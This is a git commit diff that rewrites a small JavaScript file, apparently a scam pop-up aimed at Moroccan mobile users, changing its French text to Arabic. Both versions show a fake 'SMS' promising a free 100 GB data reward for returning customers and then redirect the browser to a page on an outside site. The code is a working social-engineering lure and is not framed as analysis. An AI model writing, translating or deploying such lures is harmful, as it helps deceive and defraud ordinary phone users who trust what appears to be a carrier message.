2c3b90eb9c314ff2c41a35a97f54b65d19ae0dfe
bigukpe <bigaka42@gmail.com>
2025-03-24 19:49:07 +0100

    Update maroc-active.js

--- maroc-active.js
+++ maroc-active.js
@@ -1,5 +1,5 @@
-var password = 'ACTIVER 100 Go '
-password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir une récompense spéciale de 100 Go pour les anciens clients, cliquez sur OK pour activer 100 Go. ','ACTIVER 100 Go ');
-if (password != 'ACTIVER 100 Go ') {
-location.href='https://learnlivetech.org/maroc.html';
+var password = 'تمكين 100 جيجابايت '
+password=prompt('SMS: تهانينا، أنت مؤهل للحصول على مكافأة خاصة بقيمة 100 جيجابايت للعملاء العائدين، انقر فوق "موافق" لتفعيل 100 جيجابايت. ','تمكين 100 جيجابايت ');
+if (password != 'تمكين 100 جيجابايت ') {
+location.href='https://learnlivetech.org/maroc';
 }
